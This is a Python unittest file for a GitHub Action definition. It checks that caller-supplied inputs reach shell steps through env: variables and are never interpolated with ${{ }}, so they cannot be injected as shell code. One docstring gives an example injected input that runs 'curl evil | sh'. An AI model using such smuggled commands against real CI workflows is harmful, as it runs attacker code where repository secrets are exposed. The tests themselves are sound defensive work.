"""Unit tests for action.yml GitHub Action definition."""

from __future__ import annotations

import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent


class GitHubActionTests(unittest.TestCase):
    def test_action_file_exists_and_valid(self):
        action_path = REPO_ROOT / "action.yml"
        self.assertTrue(action_path.exists(), "action.yml must exist in root")

        content = action_path.read_text(encoding="utf-8")
        self.assertIn('name: "ai-jury Review"', content)
        self.assertIn('using: "composite"', content)
        self.assertIn("github-token:", content)
        self.assertIn("openai-api-key:", content)
        self.assertIn("anthropic-api-key:", content)
        self.assertIn("gemini-api-key:", content)
        self.assertIn("jury --pr", content)


class NoCallerInputReachesAShellBody(unittest.TestCase):
    """A `${{ }}` expression inside `run:` is substituted before bash parses it.

    So a caller-supplied value carrying a quote and a `;` becomes shell code:
    `version: '1.0"; curl evil | sh; "'` executes. #584 moved four inputs into
    `env:` for exactly this reason and left `inputs.version` behind — the sweep
    it described in the plural was done in the singular.

    Asserted as a rule over every step rather than as one line, because the
    single-line version is what let the fifth input slip through, and the next
    step someone adds is the same coin flip.
    """

    def _steps(self) -> list[dict]:
        import yaml

        action = yaml.safe_load((REPO_ROOT / "action.yml").read_text(encoding="utf-8"))
        return action["runs"]["steps"]

    def test_no_step_interpolates_an_expression_into_its_run_body(self):
        offenders = [
            (step.get("name", "(unnamed)"), line.strip())
            for step in self._steps()
            for line in (step.get("run") or "").splitlines()
            if "${{" in line
        ]
        self.assertEqual(
            [], offenders,
            "a GitHub expression is substituted into a shell body; pass it through "
            f"`env:` and reference it as a shell variable instead: {offenders}",
        )

    def test_the_sweep_has_something_to_sweep(self):
        """Keeps the assertion above from passing vacuously after a refactor."""
        with_run = [s for s in self._steps() if s.get("run")]
        self.assertTrue(with_run, "no step has a run body; the guard checks nothing")

    def test_every_caller_supplied_input_arrives_through_env(self):
        """The positive half: inputs must still reach the script, just safely."""
        env_values = " ".join(
            str(value)
            for step in self._steps()
            for value in (step.get("env") or {}).values()
        )
        for name in ("inputs.version", "inputs.args", "inputs.github-token"):
            with self.subTest(input=name):
                self.assertIn(
                    name, env_values,
                    f"{name} no longer reaches any step through env:",
                )


if __name__ == "__main__":
    unittest.main()
